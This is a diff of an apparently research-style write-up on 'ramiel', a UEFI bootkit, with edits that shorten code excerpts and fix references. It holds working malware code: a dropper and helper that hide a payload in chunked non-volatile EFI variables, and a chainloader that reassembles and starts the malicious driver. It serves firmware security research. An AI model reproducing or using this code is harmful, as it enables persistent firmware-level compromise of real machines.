@@ -79,79 +79,42 @@ is unknown to the chainloader, ramiel creates a variable called "guids" storing
 the guids of all chunk variables. the guid of the "guids" variable is fixed at
 compile time.
 
-runtime.c:
+runtime.c excerpt:
 ``
-    #include <stdio.h>
-    #include <stdlib.h>
-    #include <efivar.h>
-    #include <unistd.h>
-    #include <fcntl.h>
-    #include <sys/stat.h>
+    struct stat stat;
+    int fd = open(argv[3], O_RDONLY);
+    fstat(fd, &stat);
 
-    // usage: ./runtime <guid string> <var name> <filename>
+    uint8_t *buf = malloc(stat.st_size);
+    read(fd, buf, stat.st_size);
 
-    int main(int argc, char *argv[]) {
-        int ret;
-
-        if (argc != 4) {
-            printf("usage: %s <.efi name>\n", argv[0]);
-            return -1;
-        }
-
-        struct stat stat;
-        int fd = open(argv[3], O_RDONLY);
-        fstat(fd, &stat);
-
-        uint8_t *buf = malloc(stat.st_size);
-        read(fd, buf, stat.st_size);
-
-        int attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | \
-                         EFI_VARIABLE_RUNTIME_ACCESS;
-        efi_guid_t guid;
-        efi_str_to_guid(argv[1], &guid);
-        char *guid_str;
-        efi_guid_to_str(&guid, &guid_str);
-        ret = efi_set_variable(guid, argv[2], buf, stat.st_size, attributes, 777);
-        if (ret != 0) {
-            return -1;
-        }
-
-        free(buf);
-        return 0;
+    int attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | \
+                     EFI_VARIABLE_RUNTIME_ACCESS;
+    efi_guid_t guid;
+    efi_str_to_guid(argv[1], &guid);
+    ret = efi_set_variable(guid, argv[2], buf, stat.st_size, attributes, 777);
+    if (ret != 0) {
+        return -1;
     }
 ``
 
-dropper.py:
-+fix bug with newline
+dropper excerpt:
 ``
-    import sys
-    import os
-    import uuid
-
-    # usage: python3 dropper.py <filename>
-
-    MAXVARSIZE = 30000
-
-    def main():
-        guids = []
-        with open(sys.argv[1], "rb") as f:
+    guids = []
+    with open(sys.argv[1], "rb") as f:
+        chunk = f.read(MAXVARSIZE)
+        while chunk:
+            with open("chunk", "wb") as f_:
+                f_.write(chunk)
+                guid = uuid.uuid4()
+                guids.append(guid)
+                os.system(f"./runtime {str(guid)} {str(guid).upper()} chunk")
             chunk = f.read(MAXVARSIZE)
-            while chunk:
-                with open("chunk", "wb") as f_:
-                    f_.write(chunk)
-                    guid = uuid.uuid4()
-                    guids.append(guid)
-                    os.system(f"./runtime {str(guid)} {str(guid).upper()} chunk")
-                chunk = f.read(MAXVARSIZE)
 
-        with open("guids", "w", encoding="utf-16-le") as f:
-            for guid in guids:
-                f.write(str(guid).upper())
-            os.system(f"./runtime bfb35f7e-fc44-41ae-7cd9-68a80102b9d0 guids guids")
-
-
-    if __name__ == "__main__":
-        main()
+    with open("guids", "w", encoding="utf-16-le") as f:
+        for guid in guids:
+            f.write(str(guid).upper())
+        os.system(f"./runtime bfb35f7e-fc44-41ae-7cd9-68a80102b9d0 guids guids")
 ``
 
 
@@ -570,6 +533,7 @@ dumped without memory scanning:
 to reassemble the malicious driver image, ramiel first calls GetVariable on the "guids"
 variable, then calls GetVariable on every guid stored in it and copies the chunks
 to a buffer:
++TODO: remove runtime access flag from vars
 ``
     #define GUIDS_VAR_NAME L"guids"
     #define GUIDS_VAR_GUID {0xBFB35F7E, 0xFC44, 0x41AE, \
@@ -596,7 +560,6 @@ to a buffer:
     nvram_chainload() {
         EFI_STATUS status;
 
-        // set variable runtime access to false !!
         UINT8 *buf;
         UINTN bufsize;
         EFI_GUID guids_var_guid = GUIDS_VAR_GUID;
@@ -622,7 +585,6 @@ to a buffer:
         EFI_GUID *guids = AllocateZeroPool(nguids * sizeof(EFI_GUID));
 
         for (int i = 0; i < nguids; i++) {
-            Print(L"[ramiel]: nvram_chainload - guid %s\n", var_names[i]);
             StrToGuid(var_names[i], &guids[i]);
         }
 
@@ -670,8 +632,6 @@ to a buffer:
             return status;
 
         }
-
-        Print(L"[ramiel]: nvram_chainload - LoadImage of target completed\n");
 
         status = gBS->StartImage(NewImageHandle, NULL, NULL);
         if (EFI_ERROR(status)) {
@@ -756,7 +716,7 @@ com1 log:
     (gdb) source gdbscript
     (gdb) target remote localhost:1234
 
-start-vm.sh
+start-vm.sh [15]
 ``
     #!/bin/bash
 
@@ -800,7 +760,7 @@ start-vm.sh
 
 ``
 
-gen_symbol_offsets.sh
+gen_symbol_offsets.sh, adapted from [5]
 ``
     #!/bin/bash
 
@@ -830,21 +790,23 @@ gen_symbol_offsets.sh
 <========================================================================================>
 
 references:
-[1] x86sec.com/posts/2022/09/26/uefi-oprom-bootkit
-[2] casualhacking.io/blog/2020/1/4/executing-custom-option-rom-on-nucs-and-persisting-\
-    code-in-uefi-runtime-services
-[3] casualhacking.io/blog/2019/12/3/using-optionrom-to-overwrite-smmsmi-handlers-in-qemu
-[4] laurie0131.gitbooks.io/memory-protection-in-uefi-bios/content/protection-for-pe-\
-    image-uefi.html
+[1] https://x86sec.com/posts/2022/09/26/uefi-oprom-bootkit
+[2] https://casualhacking.io/blog/2020/1/4/executing-custom-option-rom-on-\
+    nucs-and-persisting-code-in-uefi-runtime-services
+[3] https:// casualhacking.io/blog/2019/12/3/using-optionrom-to-overwrite-\
+    smmsmi-handlers-in-qemu
+[4] https://laurie0131.gitbooks.io/memory-protection-in-uefi-bios/content/\
+    protection-for-pe-image-uefi.html
 [5] https://retrage.github.io/2019/12/05/debugging-ovmf-en.html
-[6]
+[6] http://ftp.kolibrios.org/users/seppe/UEFI/Beyond_BIOS_Second_Edition_\
+    Digital_Edition_(15-12-10)%20.pdf
 [7] https://wikileaks.org/ciav7p1/cms/page_31227915.html
 [8] https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/uefi-\
     validation-option-rom-validation-guidance?view=windows-10
 [9] https://www.intel.com/content/www/us/en/support/articles/000005790/software/\
     manageability-products.html
 [10] https://lkml.iu.edu/hypermail/linux/kernel/1509.2/06385.html
-[11]
+[11] https://edk2-docs.gitbook.io/understanding-the-uefi-secure-boot-chain/
 [12] https://bsdio.com/edk2/docs/master/_boot_android_boot_img_8c_source.html
 [13] https://edk2-docs.gitbook.io/edk-ii-uefi-driver-writer-s-guide/7_driver_entry_point/\
      72_uefi_driver_model
